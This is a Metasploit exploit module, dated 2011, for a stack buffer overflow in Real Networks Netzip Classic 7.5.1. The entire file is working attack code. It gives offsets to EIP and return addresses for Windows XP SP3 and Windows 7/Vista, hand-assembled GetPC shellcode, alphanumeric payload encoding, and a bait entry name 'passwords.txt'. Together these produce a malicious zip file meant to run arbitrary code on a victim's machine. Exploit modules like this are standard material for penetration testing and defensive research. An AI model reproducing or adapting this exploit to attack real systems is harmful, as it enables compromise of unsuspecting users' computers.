##
# $Id: real_networks_netzip_bof.rb 13952 2011-10-16 15:47:04Z todb $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'rex/zip'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::FILEFORMAT

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Real Networks Netzip Classic 7.5.1 86 File Parsing Buffer Overflow Vulnerability',
			'Description'    => %q{
					This module exploits a stack-based buffer overflow vulnerability in
				version 7.5.1 86 of Real Networks Netzip Classic.
				In order for the command to be executed, an attacker must convince someone to
				load a specially crafted zip file with NetZip Classic.
				By doing so, an attacker can execute arbitrary code as the victim user.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'C4SS!0 G0M3S', # Vulnerability discovery and original exploit
					'TecR0c <roccogiovannicalvi[at]gmail.com>', # Metasploit module
				],
			'Version'        => '$Revision: 13952 $',
			'References'     =>
				[
					[ 'BID', '46059' ],
					[ 'URL', 'http://proforma.real.com' ],
					[ 'URL', 'http://www.exploit-db.com/exploits/16083/' ],
				],
			'Platform'          => [ 'win' ],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload' =>
				{
					'Space'         => 1000,
					'BadChars'      => Rex::Text.charset_exclude(Rex::Text::AlphaNumeric),
					'DisableNops'   => true,
					'EncoderOptions' =>
						{
							'BufferRegister' => 'ESI'
						}
				},
			'Targets'        =>
				[
					[
						'Windows XP SP3',
						{
							'Offset' => 247,        # To EIP
							'Ret'    => 0x10061cf9, # PUSH ESP # RETN 08 - NPSYSTEM.dll 7.5.1.86
							'Max'    => 2000,       # Max buffer size
						}
					],

					[
						'Windows 7/Windows Vista',
						{
							'Offset' => 248,        # To EIP
							'Ret'    => 0x10061cf9, # PUSH ESP # RETN 08 - NPSYSTEM.dll 7.5.1.86
							'Max'    => 2000,       # Max buffer size
						}
					],
				],
			'DisclosureDate' => 'Jan 30 2011',
			'DefaultTarget'  => 0))

			register_options(
			[
				OptString.new('FILENAME', [ true, 'The output file name.', 'msf.zip']),
				OptString.new('CONTENTNAME', [ true, 'Name of the fake zipped file', 'passwords.txt']),
			], self.class)

	end

	def exploit

		buffer = "#{datastore['CONTENTNAME']}"
		buffer << ' ' * (target['Offset']-buffer.length)
		buffer << [target.ret].pack('V')
		buffer << make_nops(8)

		# GetPC - Non ascii characters get converted
		buffer << "\x89\x05"   #jmp short (5 bytes) to 'jmp back' at end
		buffer << "\x5e"       #pop esi
		buffer << "\x41"       #nop (inc ecx)
		buffer << "\x98\x99"   #call esi
		buffer << "\x41"       #nop (inc ecx)
		buffer << "\x8a\x94\x98\x98\x98"  #jmp back to pop esi
		buffer << payload.encoded
		buffer << rand_text_alpha(target['Max']-buffer.length)

		zip = Rex::Zip::Archive.new
		xtra = [0xdac0ffee].pack('V')
		comment = [0xbadc0ded].pack('V')
		zip.add_file(buffer, xtra, comment)

		# Create the file
		print_status("Creating '#{datastore['FILENAME']}' file...")

		file_create(zip.pack)
	end

end